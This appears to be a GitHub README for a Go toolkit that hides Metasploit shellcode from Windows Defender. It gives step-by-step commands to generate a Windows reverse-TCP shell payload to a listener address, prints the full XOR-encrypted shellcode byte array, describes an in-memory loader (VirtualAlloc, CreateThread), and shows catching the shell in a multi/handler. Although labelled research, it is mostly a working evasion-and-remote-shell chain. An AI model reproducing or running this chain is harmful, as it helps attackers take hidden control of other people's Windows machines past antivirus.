
# 🛡️ Defender Evasion  

> _Because Windows Defender can’t stop what it can’t see._ 


> Minimal, research-focused toolkit for encrypted shellcode delivery & in-memory execution (Go).

---

<p align="center">
  <img src="https://img.shields.io/badge/Status-Research-red?style=for-the-badge" /> 
  <img src="https://img.shields.io/badge/Lang-Go%20%7C%20Shell-red?style=for-the-badge" /> 
  <img src="https://img.shields.io/badge/Scope-Encryption%20%7C%20Loader-blue?style=for-the-badge" />
</p>

---

## 🎯 Overview
DefenderEvasion is an **offensive research project** showcasing techniques to **slip past Windows Defender** using:  
- Custom **shellcode encryption** (XOR)  
- **In-memory execution** with Go  
- Expandable loaders (process injection, API unhooking in future)  

## 🚀 Workflow

1. **Generate Raw Payload**  

```bash
kant@APPLEs-MacBook-Pro ~/e/av-evasion> /opt/metasploit-framework/bin/msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.134.217.216 LPORT=4545 -f raw > plain-rev-shell.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes

kant@APPLEs-MacBook-Pro ~/e/av-evasion> 

```

2. **Encrypt the Shellcode**

```bash
kant@APPLEs-MacBook-Pro ~/e/av-evasion> cd encrypter/
kant@APPLEs-MacBook-Pro ~/e/a/encrypter> ls
encrypter* main.go
kant@APPLEs-MacBook-Pro ~/e/a/encrypter> rm encrypter 
kant@APPLEs-MacBook-Pro ~/e/a/encrypter> go build -o encrypter main.go
kant@APPLEs-MacBook-Pro ~/e/a/encrypter> ls
encrypter* main.go
kant@APPLEs-MacBook-Pro ~/e/a/encrypter> ./encrypter -h
Usage of ./encrypter:
  -file string
    	Path Of the Shellcode
kant@APPLEs-MacBook-Pro ~/e/a/encrypter> ./encrypter -file=../plain-rev-shell.bin
[]byte{121, 205, 6, 97, 117, 109, 73, 133, 133, 133, 196, 212, 196, 213, 215, 212, 211, 205, 180, 87, 224, 205, 14, 215, 229, 205, 14, 215, 157, 205, 14, 215, 165, 205, 138, 50, 207, 207, 205, 14, 247, 213, 200, 180, 76, 205, 180, 69, 41, 185, 228, 249, 135, 169, 165, 196, 68, 76, 136, 196, 132, 68, 103, 104, 215, 205, 14, 215, 165, 196, 212, 14, 199, 185, 205, 132, 85, 227, 4, 253, 157, 142, 135, 138, 0, 247, 133, 133, 133, 14, 5, 13, 133, 133, 133, 205, 0, 69, 241, 226, 205, 132, 85, 14, 205, 157, 213, 193, 14, 197, 165, 204, 132, 85, 102, 211, 205, 122, 76, 200, 180, 76, 196, 14, 177, 13, 205, 132, 83, 205, 180, 69, 196, 68, 76, 136, 41, 196, 132, 68, 189, 101, 240, 116, 201, 134, 201, 161, 141, 192, 188, 84, 240, 93, 221, 193, 14, 197, 161, 204, 132, 85, 227, 196, 14, 137, 205, 193, 14, 197, 153, 204, 132, 85, 196, 14, 129, 13, 205, 132, 85, 196, 221, 196, 221, 219, 220, 223, 196, 221, 196, 220, 196, 223, 205, 6, 105, 165, 196, 215, 122, 101, 221, 196, 220, 223, 205, 14, 151, 108, 206, 122, 122, 122, 216, 204, 59, 242, 246, 183, 218, 182, 183, 133, 133, 196, 211, 204, 12, 99, 205, 4, 105, 37, 132, 133, 133, 204, 12, 96, 204, 57, 135, 133, 148, 68, 143, 3, 92, 93, 196, 209, 204, 12, 97, 201, 12, 116, 196, 63, 201, 242, 163, 130, 122, 80, 201, 12, 111, 237, 132, 132, 133, 133, 220, 196, 63, 172, 5, 238, 133, 122, 80, 239, 143, 196, 219, 213, 213, 200, 180, 76, 200, 180, 69, 205, 122, 69, 205, 12, 71, 205, 122, 69, 205, 12, 68, 196, 63, 111, 138, 90, 101, 122, 80, 205, 12, 66, 239, 149, 196, 221, 201, 12, 103, 205, 12, 124, 196, 63, 28, 32, 241, 228, 122, 80, 0, 69, 241, 143, 204, 122, 75, 240, 96, 109, 22, 133, 133, 133, 205, 6, 105, 149, 205, 12, 103, 200, 180, 76, 239, 129, 196, 221, 205, 12, 124, 196, 63, 135, 92, 77, 218, 122, 80, 6, 125, 133, 251, 208, 205, 6, 65, 165, 219, 12, 115, 239, 197, 196, 220, 237, 133, 149, 133, 133, 196, 221, 205, 12, 119, 205, 180, 76, 196, 63, 221, 33, 214, 96, 122, 80, 205, 12, 70, 204, 12, 66, 200, 180, 76, 204, 12, 117, 205, 12, 95, 205, 12, 124, 196, 63, 135, 92, 77, 218, 122, 80, 6, 125, 133, 248, 173, 221, 196, 210, 220, 237, 133, 197, 133, 133, 196, 221, 239, 133, 223, 196, 63, 142, 170, 138, 181, 122, 80, 210, 220, 196, 63, 240, 235, 200, 228, 122, 80, 204, 122, 75, 108, 185, 122, 122, 122, 205, 132, 70, 205, 172, 67, 205, 0, 115, 240, 49, 196, 122, 98, 221, 239, 133, 220, 204, 66, 71, 117, 48, 39, 211, 122, 80}

```

---

3. **Paste into Loader**

The loader will:

- Decrypt using the same key (133)

- Allocate memory with VirtualAlloc

- Change memory protection to PAGE_EXECUTE_READ

- Launch shellcode in a new thread with CreateThread

---

4. **Build the Loader**

```bash
kant@APPLEs-MacBook-Pro ~/e/a/loader> GOOS=windows GOARCH=amd64 go build -a -ldflags="-s -w" -trimpath exp/main.go
```

5. **Run & Catch the Shell**

### msf 

```bash

msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.134.217.216
LHOST => 10.134.217.216
msf exploit(multi/handler) > set LPORT 4545
LPORT => 4545
msf exploit(multi/handler) > run
```
---

<img width="1299" height="438" alt="Screenshot 2025-09-05 at 5 21 36 AM" src="https://github.com/user-attachments/assets/c073ecbf-2ab0-44a0-b8ee-b2a858c5e89e" />

---

## Windows :

<img width="1060" height="610" alt="Screenshot 2025-09-05 052353" src="https://github.com/user-attachments/assets/799e382d-cb9a-47c3-9490-87a1dd8e8dd0" />

---



